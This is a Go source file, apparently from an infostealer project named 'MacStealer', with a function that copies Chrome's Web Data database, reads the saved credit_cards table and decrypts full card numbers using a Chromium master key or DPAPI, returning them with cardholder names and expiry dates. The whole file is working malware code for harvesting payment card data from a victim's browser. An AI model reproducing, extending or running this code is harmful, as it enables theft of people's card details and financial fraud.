package browsingdata

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"os"

	_ "github.com/mattn/go-sqlite3"
	"github.com/ultra-supara/MacStealer/decrypter"
	"github.com/ultra-supara/MacStealer/util"
)

// CreditCard represents a Chrome credit card entry
type CreditCard struct {
	GUID            string `json:"guid"`
	Name            string `json:"name_on_card"`
	ExpirationMonth string `json:"expiration_month"`
	ExpirationYear  string `json:"expiration_year"`
	CardNumber      string `json:"card_number"`
	Address         string `json:"billing_address_id"`
	NickName        string `json:"nickname"`
	encryptedNumber []byte
}

// GetCreditCard extracts and decrypts credit card data from Chrome's Web Data database
func GetCreditCard(base64MasterKey string, path string) ([]CreditCard, error) {
	// Decode masterkey
	key, err := base64.StdEncoding.DecodeString(base64MasterKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode master key: %w", err)
	}

	// Copy Web Data db to current directory to avoid locking issues
	ccFile := "./webdata"
	err = util.FileCopy(path, ccFile)
	if err != nil {
		return nil, fmt.Errorf("DB FileCopy failed: %w", err)
	}
	defer os.Remove(ccFile)

	// Open database
	ccDB, err := sql.Open("sqlite3", fmt.Sprintf("file:%s", ccFile))
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}
	defer ccDB.Close()

	// Query credit card data
	rows, err := ccDB.Query(`SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards`)
	if err != nil {
		return nil, fmt.Errorf("failed to query credit cards: %w", err)
	}
	defer rows.Close()

	var cards []CreditCard
	for rows.Next() {
		var (
			guid, name, month, year, address, nickname string
			encryptValue                               []byte
			decryptedNumber                            []byte
		)

		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue, &address, &nickname); err != nil {
			log.Printf("scan credit card error: %v", err)
			continue
		}

		card := CreditCard{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
			Address:         address,
			NickName:        nickname,
			encryptedNumber: encryptValue,
		}

		// Decrypt card number if encrypted
		if len(encryptValue) > 0 {
			if key == nil {
				decryptedNumber, err = decrypter.DPApi(encryptValue)
			} else {
				decryptedNumber, err = decrypter.Chromium(key, encryptValue)
			}
			if err != nil {
				log.Printf("decrypt credit card error: %v", err)
			}
		}

		if decryptedNumber != nil {
			card.CardNumber = string(decryptedNumber)
		}

		cards = append(cards, card)
	}

	return cards, nil
}
